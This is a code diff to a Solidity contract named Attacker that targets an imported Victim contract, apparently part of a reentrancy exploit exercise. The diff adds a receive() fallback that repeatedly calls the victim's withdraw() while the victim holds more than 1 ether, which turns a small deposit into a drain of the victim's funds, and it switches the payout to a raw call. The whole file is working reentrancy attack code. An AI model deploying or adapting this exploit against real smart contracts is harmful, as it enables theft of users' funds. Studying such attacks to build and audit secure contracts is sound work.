@@ -1,6 +1,6 @@
 //SPDX-License-Identifier: MIT
 
-pragma solidity ^0.8.24;
+pragma solidity ^0.7.6;
 
 import './Victim.sol';
 
@@ -11,13 +11,22 @@ contract Attacker{
         victim = Victim(_victim);
     }
 
-    function attack() public payable{
-        require(msg.value > 0, "You need ether to attack the contract.");
-        victim.deposit{value: msg.value}();
+    receive() external payable{
+        if(address(victim).balance>1 ether){
+            victim.withdraw();
+        }
+    }
+
+   function attack() public payable {
+        require(msg.value == 0.001 ether, "Send the required attack amount");
+        victim.deposit{value: 0.001 ether}(); // Deposit some Ether to the Store contract
         victim.withdraw();
     }
 
-    function withdraw() public {
-        payable(msg.sender).transfer(address(this).balance);
+    function withdraw() public{
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to withdraw Ether");
+
     }
+
 }
